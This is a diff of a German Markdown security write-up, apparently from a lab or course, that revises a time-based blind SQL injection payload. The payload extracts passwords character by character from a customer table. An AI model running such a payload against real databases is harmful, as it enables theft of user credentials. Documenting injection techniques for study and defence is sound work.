@@ -79,7 +79,7 @@ Allerdings wird diese Querry in einem Großteil der Fälle trotzdem nicht funkti
 Es ist jedoch möglich einen timebased Angriff durchzuführen.  
 Mit der folgenden Querry kann man Benutzernamen und die die dazugehörenden Passwörter Character für Character aus der Datenbank ziehen.  
 
-```1" UNION SELECT IF(SUBSTRING(KENNWORT,1,1) = CHAR(80), DO SLEEP(5),null) FROM KUNDEN WHERE ID = stump.stefan;#```  
+```1" UNION SELECT IF(SUBSTRING(KENNWORT,1,1) = CHAR(80),BENCHMARK(100000,sha1(1)),null) KENNWORT FROM KUNDEN WHERE ID = "stump.stefan```
 
 
 ## XSS  
